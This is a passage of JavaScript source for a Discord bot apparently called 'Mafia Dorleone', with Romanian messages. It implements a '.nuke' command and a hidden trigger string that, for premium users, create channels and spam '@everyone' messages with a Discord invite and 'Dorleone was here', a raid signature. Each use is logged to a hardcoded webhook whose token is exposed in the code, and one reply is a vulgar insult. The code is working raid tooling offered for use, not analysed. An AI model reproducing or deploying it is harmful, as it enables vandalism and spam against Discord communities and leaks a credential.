        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()
	    	.setColor('#00001')
                .setTitle("Permission Reject")
	    	.setDescription("<a:DND:902590455961776210> You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}

let dadada1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("Dorleone Logs")
.setFooter('mafia-dorleone.tk', 'https://media.discordapp.net/attachments/894676590947074068/896421988623597608/4c395ff14d580931cc4c4af601f56ab5.png')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **.nuke** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("896328401525288970", "OlUKUp3gtLIf1GBOXM2drbHNyH9yAwnvdg6WKC1vjmhoU-pocGRSJnGXICBaHr7ueD0S");
    await wrb.send(dadada1)

    await message.guild.channels.create(`LXX`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    })
  }
})

client.on('message', async (message) => {
  if (message.content === '1221ijwvaijhviwajeveryone@here') {

        let Embed4 = new Discord.MessageEmbed()
        .setColor("#0d0d0d")
        .setTitle("Permission Reject")
        .setDescription(`<a:emoji_1581:885300167119630426> Nu ai permisiunea necesara`)
                .setFooter(`Mafia Dorleone | Premium`, `https://images-ext-2.discordapp.net/external/O6fo8O5ExVsJ4Ax9RwxMC9AA4ddabvEmqu5GVh9CREk/%3Fsize%3D256%26f%3D.gif/https/cdn.discordapp.com/avatars/747480885573713984/a_5d39ada7788dcfd646b307582e7019a0.gif`);
         
      let user = message.mentions.members.first() || message.author;
      let vip5 = await db.fetch(`dev_${message.author.id}`)
    
         if(vip5 < 1) return message.channel.send(Embed4)

    if (message.guild.id === "847915478483206194") return message.channel.send("ai belit pula coaie morr")
    await message.guild.channels.create(`server-closed`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
    message.channel.send('@everyone https://discord.gg/EfdUHfU6cK Dorleone was here')
  })
  }
})